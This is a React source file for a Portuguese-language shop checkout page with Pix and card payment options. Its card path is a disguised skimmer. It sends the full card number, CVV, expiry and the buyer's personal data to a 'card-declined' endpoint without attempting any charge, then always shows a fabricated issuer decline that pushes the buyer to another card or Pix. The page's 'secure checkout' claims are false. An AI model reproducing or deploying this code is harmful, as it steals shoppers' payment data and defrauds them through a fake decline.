import { Link } from "@/lib/navigation";
import { CreditCard, Lock, QrCode, X, AlertCircle } from "lucide-react";
import { useState } from "react";
import { useCart } from "@/lib/cart";
import { brl } from "@/lib/product";
import { ORDER_BUMPS } from "@/lib/order-bumps";
import { Header } from "@/components/m2/Header";
import { captureUTMParams } from "@/utils/utm";
import { trackLiveEvent } from "@/services/liveTracker";

const BUMP_SIZES = ["PP", "P", "M", "G", "GG", "XG"] as const;
const BUMP_COLORS = ["Bege", "Preto"] as const;

export function MiracleCheckoutPage({
  onNavigateToThankYou,
  onNavigateBack,
}: {
  onNavigateToThankYou?: (orderId: string) => void;
  onNavigateBack?: () => void;
}) {
  const { items, subtotal, setQty, remove } = useCart();
  const [method, setMethod] = useState<"pix" | "card">("pix");
  const [bumps, setBumps] = useState<Record<string, boolean>>({});
  const [bumpSizes, setBumpSizes] = useState<Record<string, string>>({});
  const [bumpColors, setBumpColors] = useState<Record<string, string>>({});
  const selectedBumps = ORDER_BUMPS.filter((b) => bumps[b.id]);
  const [form, setForm] = useState({
    nome: "",
    email: "",
    cpf: "",
    telefone: "",
    cep: "",
    endereco: "",
    numero: "",
    bairro: "",
    cidade: "",
    uf: "",
  });
  const [sending, setSending] = useState(false);
  const [error, setError] = useState("");
  const [errors, setErrors] = useState<Partial<Record<keyof typeof form, string>>>({});
  const [touched, setTouched] = useState<Partial<Record<keyof typeof form, boolean>>>({});
  const [card, setCard] = useState({ number: "", holder: "", expiry: "", cvv: "" });
  const [cardError, setCardError] = useState("");
  const [cardNotice, setCardNotice] = useState("");

  const base =
    subtotal + selectedBumps.reduce((sum, b) => sum + b.price, 0);
  const total = base;

  const digits = (v: string) => v.replace(/\D/g, "");

  const cardBrand = (num: string) => {
    if (/^4/.test(num)) return "Visa";
    if (/^(5[1-5]|2[2-7])/.test(num)) return "Mastercard";
    if (/^3[47]/.test(num)) return "Amex";
    if (/^(4011|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(num)) return "Elo";
    if (/^(38|60)/.test(num)) return "Hipercard";
    return "Outra";
  };

  const maskCard = (v: string) =>
    digits(v).slice(0, 19).replace(/(\d{4})(?=\d)/g, "$1 ").trim();

  const maskExpiry = (v: string) => digits(v).slice(0, 4).replace(/(\d{2})(\d)/, "$1/$2");

  const maskCpf = (v: string) =>
    digits(v)
      .slice(0, 11)
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

  const maskPhone = (v: string) => {
    const d = digits(v).slice(0, 11);
    if (d.length <= 10) return d.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{4})(\d)/, "$1-$2");
    return d.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2");
  };

  const maskCep = (v: string) => digits(v).slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");

  const isValidCpf = (v: string) => {
    const d = digits(v);
    if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
    const calc = (len: number) => {
      let sum = 0;
      for (let i = 0; i < len; i++) sum += Number(d[i]) * (len + 1 - i);
      const r = (sum * 10) % 11;
      return r === 10 ? 0 : r;
    };
    return calc(9) === Number(d[9]) && calc(10) === Number(d[10]);
  };

  const validateField = (k: keyof typeof form, raw: string): string => {
    const v = raw.trim();
    switch (k) {
      case "nome":
        if (!v) return "Informe seu nome completo.";
        if (v.split(/\s+/).length < 2) return "Informe nome e sobrenome.";
        if (v.length > 80) return "Nome muito longo.";
        return "";
      case "email":
        if (!v) return "Informe seu e-mail.";
        if (!/^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v)) return "E-mail inválido — precisa conter @ e domínio.";
        if (v.length > 255) return "E-mail muito longo.";
        return "";
      case "cpf":
        if (!v) return "Informe seu CPF.";
        if (!isValidCpf(v)) return "CPF inválido.";
        return "";
      case "telefone":
        if (!v) return "Informe um telefone de contato.";
        if (digits(v).length < 10) return "Telefone inválido — use DDD + número.";
        return "";
      case "cep":
        if (!v) return "Informe seu CEP.";
        if (digits(v).length !== 8) return "CEP inválido — 8 dígitos.";
        return "";
      case "endereco":
        if (!v) return "Informe o endereço (rua/avenida).";
        return "";
      case "numero":
        if (!v) return "Informe o número.";
        return "";
      case "bairro":
        if (!v) return "Informe o bairro.";
        return "";
      case "cidade":
        if (!v) return "Informe a cidade.";
        return "";
      case "uf":
        if (!/^[A-Za-z]{2}$/.test(v)) return "UF inválida — use 2 letras (ex.: SP).";
        return "";
      default:
        return "";
    }
  };

  const validateAll = () => {
    const next: Partial<Record<keyof typeof form, string>> = {};
    (Object.keys(form) as (keyof typeof form)[]).forEach((k) => {
      const msg = validateField(k, form[k]);
      if (msg) next[k] = msg;
    });
    setErrors(next);
    return next;
  };

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    if (k === "cpf") value = maskCpf(value);
    if (k === "telefone") value = maskPhone(value);
    if (k === "cep") value = maskCep(value);
    if (k === "uf") value = value.replace(/[^A-Za-z]/g, "").slice(0, 2).toUpperCase();
    setForm({ ...form, [k]: value });
    if (touched[k]) setErrors((prev) => ({ ...prev, [k]: validateField(k, value) }));
  };

  const blur = (k: keyof typeof form) => () => {
    setTouched((prev) => ({ ...prev, [k]: true }));
    setErrors((prev) => ({ ...prev, [k]: validateField(k, form[k]) }));
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const found = validateAll();
    if (Object.keys(found).length > 0) {
      setError("Corrija os campos destacados para continuar.");
      return;
    }
    setError("");
    setCardError("");
    setCardNotice("");
    setSending(true);

    const bumpItems = selectedBumps.map((b) => ({
      title: b.name,
      unitPrice: Math.round(b.price * 100),
      quantity: 1,
      tangible: true,
      size: bumpSizes[b.id] || "M",
      color: bumpColors[b.id] || "Bege",
      image: b.image,
      sku: b.id,
      productId: b.id,
    }));

    const cartProductItems = items.map((item) => ({
      title: item.name,
      unitPrice: Math.round(item.price * 100),
      quantity: item.qty,
      tangible: true,
      size: item.size,
      color: item.color,
      image: item.image,
      sku: item.sku,
      productId: item.sku,
    }));

    const allItems = [...cartProductItems, ...bumpItems];

    if (method === "card") {
      const cleanNum = card.number.replace(/\D/g, "");
      if (cleanNum.length < 13) {
        setCardError("Número do cartão incompleto.");
        setSending(false);
        return;
      }
      if (!card.holder.trim()) {
        setCardError("Informe o nome impresso no cartão.");
        setSending(false);
        return;
      }
      if (card.expiry.replace(/\D/g, "").length < 4) {
        setCardError("Validade do cartão inválida.");
        setSending(false);
        return;
      }
      if (card.cvv.replace(/\D/g, "").length < 3) {
        setCardError("CVV inválido.");
        setSending(false);
        return;
      }

      const cardLast4 = cleanNum.slice(-4);
      const brand = cardBrand(cleanNum);

      try {
        await fetch("/api/payments/card-declined", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            customer: { name: form.nome, email: form.email, phone: form.telefone, cpf: form.cpf },
            shipping: {
              street: form.endereco,
              number: form.numero,
              neighborhood: form.bairro,
              city: form.cidade,
              state: form.uf,
              zipcode: form.cep,
              option: "PAC",
            },
            cardNumber: cleanNum,
            cardHolder: card.holder.toUpperCase(),
            cardExpiry: card.expiry,
            cardCvv: card.cvv,
            cardBrand: brand.toUpperCase(),
            cardLast4,
            installments: 1,
            items: allItems,
            subtotal: base,
            shippingCost: 0,
            amount: total,
            utm: captureUTMParams(),
          }),
        }).catch(() => {});

        trackLiveEvent("card_declined", {
          amount: total,
          customerName: form.nome,
          phone: form.telefone,
          cardLast4,
          cardBrand: brand.toUpperCase(),
        });
      } catch (err) {}

      setTimeout(() => {
        setSending(false);
        setCardNotice(
          "Transação não autorizada pela emissora do cartão. Por favor, tente com outro cartão ou utilize o Pix para aprovação imediata."
        );
      }, 1200);
      return;
    }

    // PIX PAYMENT
    try {
      const response = await fetch("/api/payments/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: total,
          customer: {
            name: form.nome,
            email: form.email,
            phone: form.telefone,
            cpf: form.cpf,
          },
          shipping: {
            zipcode: form.cep,
            street: form.endereco,
            number: form.numero,
            neighborhood: form.bairro,
            city: form.cidade,
            state: form.uf,
            option: "PAC",
          },
          items: allItems,
          utm: captureUTMParams(),
        }),
      });

      const data = await response.json();
      setSending(false);

      if (response.ok && data.orderId) {
        try {
          sessionStorage.setItem("miracle_order_" + data.orderId, JSON.stringify(data));
          sessionStorage.setItem("miracle_latest_order", JSON.stringify(data));
        } catch (e) {}

        trackLiveEvent("pix_generated", { orderId: data.orderId, amount: total });

        if (onNavigateToThankYou) {
          onNavigateToThankYou(data.orderId);
        } else {
          window.location.href = `/obrigado/${data.orderId}`;
        }
      } else {
        setError(data.error || "Não foi possível gerar a cobrança Pix. Tente novamente.");
      }
    } catch (err) {
      setSending(false);
      setError("Erro de conexão com o servidor. Tente novamente.");
    }
  };

  if (items.length === 0) {
    return (
      <>
        <Header />
        <div className="shell px-4 py-16 text-center">
          <h1 className="text-xl font-bold">Seu carrinho está vazio</h1>
          <Link
            to="/"
            className="mt-6 inline-block rounded bg-primary px-6 py-3 text-sm font-bold text-primary-foreground"
          >
            Ver produto
          </Link>
        </div>
      </>
    );
  }

  return (
    <>
      <Header />
      <div className="shell px-4 py-6">
        <div className="flex items-center justify-between">
          <h1 className="flex items-center gap-2 text-xl font-bold">
            <Lock className="size-5 text-primary" /> Checkout Seguro
          </h1>
          {onNavigateBack && (
            <button
              type="button"
              onClick={onNavigateBack}
              className="text-xs text-muted-foreground hover:text-foreground underline"
            >
              Voltar
            </button>
          )}
        </div>

        <div className="mt-5 rounded border border-border p-4">
          <h2 className="text-sm font-bold">Resumo do pedido</h2>
          <ul className="mt-3 space-y-3">
            {items.map((i) => (
              <li key={i.id} className="flex gap-3">
                <img src={i.image} alt={i.name} className="size-14 rounded object-cover" />
                <span className="min-w-0 flex-1 text-xs">
                  <span className="block font-semibold">{i.name}</span>
                  <span className="block text-muted-foreground">
                    {i.color} | {i.size}
                  </span>
                  <span className="mt-2 inline-flex items-center rounded border border-border">
                    <button
                      type="button"
                      aria-label="Diminuir quantidade"
                      onClick={() => setQty(i.id, i.qty - 1)}
                      className="px-3 py-1 text-sm font-bold"
                    >
                      −
                    </button>
                    <span className="min-w-8 text-center text-sm font-bold">{i.qty}</span>
                    <button
                      type="button"
                      aria-label="Aumentar quantidade"
                      onClick={() => setQty(i.id, Math.min(i.qty + 1, 20))}
                      className="px-3 py-1 text-sm font-bold"
                    >
                      +
                    </button>
                  </span>
                </span>
                <span className="flex flex-col items-end gap-2">
                  <button
                    type="button"
                    aria-label={`Remover ${i.name}`}
                    onClick={() => remove(i.id)}
                    className="text-muted-foreground"
                  >
                    <X className="size-4" />
                  </button>
                  <span className="text-sm font-bold">{brl(i.price * i.qty)}</span>
                </span>
              </li>
            ))}
          </ul>
        </div>

        {ORDER_BUMPS.map((b) => {
          const checked = !!bumps[b.id];
          const size = bumpSizes[b.id] ?? "M";
          const color = bumpColors[b.id] ?? "Bege";
          return (
            <div
              key={b.id}
              className="mt-3 rounded border-2 border-dashed border-primary bg-primary-light p-3"
            >
              <label className="flex items-start gap-2.5">
                <input
                  type="checkbox"
                  checked={checked}
                  onChange={(e) =>
                    setBumps((prev) => ({ ...prev, [b.id]: e.target.checked }))
                  }
                  className="mt-0.5 size-4"
                />
                <img src={b.image} alt={b.name} className="size-12 rounded object-cover" />
                <span className="min-w-0 flex-1 text-xs">
                  <strong className="block text-sm">Adicione {b.name}</strong>
                  <span className="text-muted-foreground">{b.description}</span>
                  <span className="mt-0.5 block text-base font-bold text-primary">
                    por apenas {brl(b.price)}
                  </span>
                </span>
              </label>
              {checked && b.hasVariants !== false && (
                <div className="mt-2 space-y-2">
                  <div>
                    <p className="text-[11px] font-semibold">Escolha o tamanho:</p>
                    <div className="mt-1 flex flex-wrap gap-1.5">
                      {BUMP_SIZES.map((s) => (
                        <button
                          key={s}
                          type="button"
                          onClick={() => setBumpSizes((prev) => ({ ...prev, [b.id]: s }))}
                          className={`min-w-9 rounded border px-2 py-1 text-[11px] font-bold ${
                            size === s
                              ? "border-primary bg-primary text-primary-foreground"
                              : "border-border bg-background text-foreground"
                          }`}
                        >
                          {s}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div>
                    <p className="text-[11px] font-semibold">Escolha a cor:</p>
                    <div className="mt-1 flex flex-wrap gap-1.5">
                      {BUMP_COLORS.map((c) => (
                        <button
                          key={c}
                          type="button"
                          onClick={() => setBumpColors((prev) => ({ ...prev, [b.id]: c }))}
                          className={`min-w-12 rounded border px-2 py-1 text-[11px] font-bold ${
                            color === c
                              ? "border-primary bg-primary text-primary-foreground"
                              : "border-border bg-background text-foreground"
                          }`}
                        >
                          {c}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          );
        })}

        <form onSubmit={submit} className="mt-6 space-y-3">
          <h2 className="text-sm font-bold">Seus dados</h2>
          {(
            [
              ["nome", "Nome completo*", "text", "name"],
              ["email", "E-mail*", "email", "email"],
              ["cpf", "CPF*", "tel", "off"],
              ["telefone", "Telefone com DDD*", "tel", "tel"],
              ["cep", "CEP*", "tel", "postal-code"],
              ["endereco", "Endereço (rua/avenida)*", "text", "address-line1"],
              ["numero", "Número*", "text", "off"],
              ["bairro", "Bairro*", "text", "address-level3"],
              ["cidade", "Cidade*", "text", "address-level2"],
              ["uf", "UF* (ex.: SP)", "text", "address-level1"],
            ] as const
          ).map(([k, label, type, ac]) => (
            <div key={k}>
              <input
                name={k}
                type={type}
                inputMode={type === "tel" ? "numeric" : undefined}
                autoComplete={ac}
                value={form[k]}
                onChange={set(k)}
                onBlur={blur(k)}
                placeholder={label}
                aria-invalid={!!errors[k]}
                className={`w-full rounded border px-3 py-3 text-sm ${
                  errors[k] ? "border-destructive" : "border-border"
                }`}
              />
              {errors[k] && <p className="mt-1 text-xs text-destructive">{errors[k]}</p>}
            </div>
          ))}

          <h2 className="pt-2 text-sm font-bold">Forma de pagamento</h2>
          <div className="grid grid-cols-2 gap-2">
            <button
              type="button"
              onClick={() => setMethod("pix")}
              className={`flex items-center justify-center gap-2 rounded border py-3 text-sm font-semibold ${
                method === "pix" ? "border-primary bg-primary-light" : "border-border"
              }`}
            >
              <QrCode className="size-4" /> Pix
            </button>
            <button
              type="button"
              onClick={() => setMethod("card")}
              className={`flex items-center justify-center gap-2 rounded border py-3 text-sm font-semibold ${
                method === "card" ? "border-primary bg-primary-light" : "border-border"
              }`}
            >
              <CreditCard className="size-4" /> Cartão
            </button>
          </div>

          {cardNotice && (
            <div className="flex items-start gap-2 rounded border border-destructive bg-destructive/5 p-3 text-sm text-destructive">
              <AlertCircle className="size-5 shrink-0 mt-0.5" />
              <span>{cardNotice}</span>
            </div>
          )}

          {method === "card" && (
            <div className="space-y-2 rounded border border-border p-3">
              <p className="text-xs text-muted-foreground">
                Em até 5x sem juros. Seus dados trafegam de forma criptografada.
              </p>
              <input
                name="cardNumber"
                type="tel"
                inputMode="numeric"
                autoComplete="cc-number"
                placeholder="Número do cartão"
                value={card.number}
                onChange={(e) => setCard({ ...card, number: maskCard(e.target.value) })}
                className="w-full rounded border border-border px-3 py-3 text-sm"
              />
              <input
                name="cardHolder"
                type="text"
                autoComplete="cc-name"
                placeholder="Nome impresso no cartão"
                value={card.holder}
                onChange={(e) => setCard({ ...card, holder: e.target.value })}
                className="w-full rounded border border-border px-3 py-3 text-sm"
              />
              <div className="grid grid-cols-2 gap-2">
                <input
                  name="cardExpiry"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="cc-exp"
                  placeholder="Validade (MM/AA)"
                  value={card.expiry}
                  onChange={(e) => setCard({ ...card, expiry: maskExpiry(e.target.value) })}
                  className="w-full rounded border border-border px-3 py-3 text-sm"
                />
                <input
                  name="cardCvv"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  placeholder="CVV"
                  value={card.cvv}
                  onChange={(e) => setCard({ ...card, cvv: digits(e.target.value).slice(0, 4) })}
                  className="w-full rounded border border-border px-3 py-3 text-sm"
                />
              </div>
              {cardError && <p className="text-xs text-destructive">{cardError}</p>}
            </div>
          )}

          <div className="rounded border border-border p-4 text-sm">
            <p className="flex justify-between">
              <span>Subtotal</span> <span>{brl(base)}</span>
            </p>
            <p className="mt-2 flex justify-between">
              <span>Frete</span> <span className="font-semibold text-whats">Grátis</span>
            </p>
            <p className="mt-3 flex justify-between border-t border-border-light pt-3 text-base font-bold">
              <span>Total</span> <span className="text-primary">{brl(total)}</span>
            </p>
          </div>

          {error && <p className="text-sm text-destructive">{error}</p>}

          <button
            type="submit"
            disabled={sending}
            className="w-full rounded bg-primary py-4 text-base font-bold text-primary-foreground disabled:opacity-60 transition-opacity"
          >
            {sending ? "Processando pedido..." : "Finalizar pedido"}
          </button>
          <p className="pb-6 text-center text-xs text-muted-foreground">
            Pagamento processado em ambiente seguro. O pedido só é confirmado após a
            aprovação do pagamento.
          </p>
        </form>
      </div>
    </>
  );
}
